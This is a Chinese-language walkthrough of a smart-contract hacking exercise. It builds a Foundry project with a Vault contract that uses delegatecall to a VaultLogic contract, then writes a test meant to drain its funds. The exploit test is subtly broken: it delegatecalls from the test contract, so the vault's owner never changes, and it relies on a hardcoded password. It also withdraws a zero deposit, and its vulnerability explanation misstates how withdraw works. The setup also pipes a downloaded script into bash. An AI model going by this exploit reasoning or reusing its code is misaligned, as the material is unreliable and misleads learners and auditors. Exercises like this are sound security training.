阅读代码  `Vault.sol` 及测试用例，在测试用例中 `testExploit` 函数添加一些代码，设法取出预先部署的 Vault 合约内的所有资金。

我们需要设置一个 Foundry 项目，编写合约代码，编写测试用例，并运行测试。以下是详细的步骤和代码示例。

### 设置 Foundry 项目

首先，确保你已安装 Foundry。如果没有安装，可以通过以下命令安装：

```
curl -L https://foundry.paradigm.xyz | bash
foundryup
```

安装完成后，创建一个新的 Foundry 项目：

```
forge init hack_Vault
cd hack_Vault
forge install OpenZeppelin/openzeppelin-contracts
```

**生成 `remappings.txt`：**

在项目根目录下运行以下命令：

```
forge remappings > remappings.txt
```

这将生成一个 `remappings.txt` 文件，并将当前依赖项的映射信息写入其中。打开生成的 `remappings.txt`，写入以下的内容：

```
@openzeppelin/=lib/openzeppelin-contracts/
```

- `@openzeppelin/` 是 Solidity 中 `import` 的路径前缀。
- `lib/openzeppelin-contracts/` 是 OpenZeppelin 库在本地文件系统中的相对路径。

在src中新建一个文件Vault.sol

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract VaultLogic {
  //记录合约的拥有者（即合约部署者）
  address public owner;
  //私有变量，用于验证修改拥有者的权限。
  bytes32 private password;
  //在合约部署时设置 owner 为部署者，password 为传入的密码
  constructor(bytes32 _password) public {
    owner = msg.sender;
    password = _password;
  }
  //允许当前拥有者通过提供正确的密码来修改合约的拥有者
  function changeOwner(bytes32 _password, address newOwner) public {
    if (password == _password) {
        owner = newOwner;
    } else {
      revert("password error");
    }
  }
}

contract Vault {
	//记录合约的拥有者（即合约部署者）
  address public owner;
  //是一个 VaultLogic 合约的实例，使用其地址初始化
  VaultLogic logic;
  //一个映射，用于记录每个地址存储的资金数量
  mapping (address => uint) deposites;
  //一个布尔变量，指示是否可以进行提款
  bool public canWithdraw = false;
 //合约在部署时初始化 logic 合约，并将部署者设为合约拥有者
  constructor(address _logicAddress) public {
    logic = VaultLogic(_logicAddress);
    owner = msg.sender;
  }

  //函数是一个后备函数，当没有匹配函数被调用时触发。这里，它使用 delegatecall 调用 VaultLogic 合约的逻辑
  fallback() external {
    (bool result,) = address(logic).delegatecall(msg.data);
    if (result) {
      this;
    }
  }
  //用于接收以太坊转账
  receive() external payable {

  }
  //允许用户通过调用此函数向合约存入资金，金额将记录在 deposites 映射中
  function deposite() public payable { 
    deposites[msg.sender] += msg.value;
  }
  //检查合约的余额是否为零，返回 true 则表示没有余额
  function isSolve() external view returns (bool){
    if (address(this).balance == 0) {
      return true;
    } 
  }
  //允许合约拥有者开启提款功能
  function openWithdraw() external {
    if (owner == msg.sender) {
      canWithdraw = true;
    } else {
      revert("not owner");
    }
  }
  //允许用户在 canWithdraw 变量为 true 的情况下提款。提款成功后，将用户的存款重置为零
  function withdraw() public {

    if(canWithdraw && deposites[msg.sender] >= 0) {
      (bool result,) = msg.sender.call{value: deposites[msg.sender]}("");
      if(result) {
        deposites[msg.sender] = 0;
      }
      
    }

  }

}
```

测试用例中添加代码以提取 `Vault` 合约中的所有资金，我们需要分析合约的漏洞并利用它。根据提供的 `Vault` 和 `VaultLogic` 合约代码，漏洞主要体现在以下几个方面：

1. **权限检查不足**: `Vault` 合约中的 `withdraw` 方法在 `canWithdraw` 为 `true` 时允许任何人提取资金，而不仅限于存款人。这意味着，如果我们可以将 `canWithdraw` 设置为 `true`，任何人都可以提取所有资金。

2. **`delegatecall` 的使用**: `Vault` 合约使用 `delegatecall` 调用 `VaultLogic` 合约的逻辑。这意味着，如果我们可以通过 `delegatecall` 发送恶意数据，我们可以在 `Vault` 合约的上下文中执行任意代码。

   新建一个测试文件test/Vault.t.sol

```
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Vault.sol";




contract VaultExploiter is Test {
    Vault public vault;
    VaultLogic public logic;

    address owner = address (1);
    address palyer = address (2);

    function setUp() public {
        vm.deal(owner, 1 ether);

        vm.startPrank(owner);
        logic = new VaultLogic(bytes32("0x1234"));
        vault = new Vault(address(logic));

        vault.deposite{value: 0.1 ether}();
        vm.stopPrank();

    }

    function testExploit() public {
        vm.deal(palyer, 1 ether);
        vm.startPrank(palyer);

        // 利用 delegatecall 直接调用 VaultLogic 合约的 changeOwner 函数
        bytes32 correctPassword = bytes32("0x1234");
        address palyerAddress = palyer;
        bytes memory data = abi.encodeWithSignature("changeOwner(bytes32,address)", correctPassword, palyerAddress);

        (bool success, ) = address(vault).delegatecall(data);
        require(success, "changeOwner failed");

        // 现在攻击者是 owner，可以调用 openWithdraw 方法
        vault.openWithdraw();

        // 提取所有资金
        vault.withdraw();

        require(vault.isSolve(), "solved");
        vm.stopPrank();
    }


}
```

运行测试命令forge test

测试结果：

